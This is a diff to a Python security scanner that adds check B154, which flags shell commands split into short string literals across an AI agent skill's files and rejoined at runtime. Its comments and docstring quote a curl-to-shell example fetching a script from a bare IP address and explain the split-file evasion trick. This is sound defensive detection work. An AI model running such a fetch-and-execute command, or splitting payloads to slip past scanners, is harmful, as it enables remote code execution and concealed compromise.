@@ -1483,6 +1483,20 @@ _XFILE_STRING_LITERAL_RE = re.compile(r'"([^"\n]{8,})"|\'([^\'\n]{8,})\'')
 _XFILE_WINDOW_MAX_FRAGS = 300  # above this, only the full in-order join is tried (perf bound)
 
 
+# B154: same idea as _XFILE_STRING_LITERAL_RE but a much lower per-literal floor (2 chars,
+# not 8) — a deliberately-split PLAINTEXT command fragment can be as short as "cur" + "l
+# -s http://.../x|sh". The 8-char floor exists to keep B90's base64-fragment collection
+# from drowning in short prose; here the FP bar is the reassembled-shape test itself
+# (_decoded_is_payload demands a very specific dangerous shape), not the literal length.
+# An UPPER bound (60 chars) is also new and load-bearing (C-135, confirmed empirically
+# against clawseccheck's own installed source): a genuinely evasive split fragment must
+# be SHORT — a single fragment long enough to already read as a sentence would trip its
+# own file's scan and defeat the point of splitting. The upper bound excludes long
+# descriptive/red-team test strings (this project's own detection-pattern corpus reads
+# as attacker-shaped TEXT by design) from ever entering the candidate pool at all.
+_XFILE_PLAINTEXT_LITERAL_RE = re.compile(r'"([^"\n]{2,60})"|\'([^\'\n]{2,60})\'')
+
+
 def _b102_leading_run(text: str) -> str:
     """The base64-alphabet run touching the START of *text*, if any (bounded sample)."""
     head = text[:_B102_EDGE_SAMPLE]
@@ -3673,6 +3687,110 @@ def check_cross_file_payload(ctx: Context) -> Finding:
         PASS,
         "No base64 payload reassembles from string literals split across the skill's files.",
         "Keep any legitimately-embedded base64 in one place and out of a decode-then-run path.",
+    )
+
+
+def check_cross_file_plaintext_payload(ctx: Context) -> Finding:
+    """B154 — a PLAINTEXT (non-base64) command payload reassembled from string literals
+    split across a skill's files: the split-across-files evasion vector for a payload
+    that is never base64-encoded (so B90's base64-fragment filter + decode-sink gate never
+    sees it) — e.g. `a.py: p1="cur"` + `b.py: p2="l -s http://1.2.3.4/x|sh"`.
+
+    Reuses B90's fragment-collection loop but drops the base64-alphabet filter (collects
+    ALL string literals, not just base64-shaped ones) and skips the decode step entirely:
+    the reassembled candidate itself is tested directly against the same strong runnable-
+    payload shape B13 uses post-decode (_decoded_is_payload) — a shell path, pipe-to-shell,
+    a reverse-shell primitive, a bare-IP URL, or python -c with a dangerous import. No
+    decode sink is required (there is nothing to decode), so this fires purely on the
+    reassembled TEXT shape — the same zero-FP bar as B90's post-decode judgment, just
+    without the decode step. WARN-only: whether the fragments are actually concatenated
+    at runtime is an inference, same as B90.
+
+    Bounded by the same literal cap (_XFILE_LITERAL_CAP) and window-join cap
+    (_XFILE_WINDOW_MAX_FRAGS) as B90 — a cap hit discloses UNKNOWN, never a silent miss.
+    """
+    skills = getattr(ctx, "installed_skills", None)
+    if not skills:
+        return _custom(
+            "B154",
+            MEDIUM,
+            UNKNOWN,
+            "No installed skills to inspect for cross-file split plaintext payloads.",
+            "Run on a skill dir (--vet) or a host with installed skills.",
+        )
+    warns: list[str] = []
+    cap_hit = False
+    for name in skills:
+        sources: list = []
+        for attr in ("installed_skill_py", "installed_skill_shell", "installed_skill_js"):
+            sources.extend(getattr(ctx, attr, {}).get(name, []))
+        if not sources:
+            continue
+        frags: list[str] = []
+        for _rel, src in sources:
+            for m in _XFILE_PLAINTEXT_LITERAL_RE.finditer(src):
+                content = m.group(1) if m.group(1) is not None else m.group(2)
+                if content:
+                    frags.append(content)
+                    if len(frags) >= _XFILE_LITERAL_CAP:
+                        cap_hit = True
+                        break
+            if cap_hit:
+                break
+        if len(frags) < 2:
+            continue
+        # Deliberately NO unbounded full-in-order-join candidate here (unlike B90): with no
+        # decode/validity gate, joining thousands of unrelated plaintext fragments from a
+        # large real skill risks an incidental substring match purely by chance (confirmed
+        # empirically against clawseccheck's own installed source, C-135). A genuine split-
+        # payload evasion glues a SMALL number of ADJACENT fragments, so only bounded windows
+        # over a capped fragment slice are tried — never the whole-skill join.
+        window_frags = frags[:_XFILE_WINDOW_MAX_FRAGS]
+        candidates = [
+            "".join(window_frags[i : i + w])
+            for w in (2, 3, 4)
+            for i in range(len(window_frags) - w + 1)
+        ]
+        hit = None
+        for cand in candidates:
+            if _decoded_is_payload(cand):
+                hit = cand.strip().replace("\n", " ")[:80]
+                break
+        if hit:
+            warns.append(
+                f"{name}: a runnable command reassembles from {len(frags)} split plaintext "
+                f"string literal(s) -> '{hit}'"
+            )
+    if warns:
+        extra = f" (+{len(warns) - 4} more)" if len(warns) > 4 else ""
+        return _custom(
+            "B154",
+            MEDIUM,
+            WARN,
+            "Cross-file split plaintext payload(s): " + "; ".join(warns[:4]) + extra,
+            "A command payload broken across plaintext string literals in different files "
+            "and concatenated at runtime is a scanner-evasion pattern (the split-by-file "
+            "vector, without base64 encoding). Read the reassembled command; if it is not "
+            "something you deliberately embedded, treat the skill as malicious.",
+            warns,
+        )
+    if cap_hit:
+        return _custom(
+            "B154",
+            MEDIUM,
+            UNKNOWN,
+            f"Skill string-literal scan hit the {_XFILE_LITERAL_CAP}-literal cap — a split "
+            "plaintext payload beyond the cap would not be seen.",
+            "Re-vet the skill after trimming generated/vendored data, or inspect it manually.",
+        )
+    return _custom(
+        "B154",
+        MEDIUM,
+        PASS,
+        "No plaintext command payload reassembles from string literals split across the "
+        "skill's files.",
+        "Keep command fragments out of separate string literals that get concatenated "
+        "and executed at runtime.",
     )
 
 
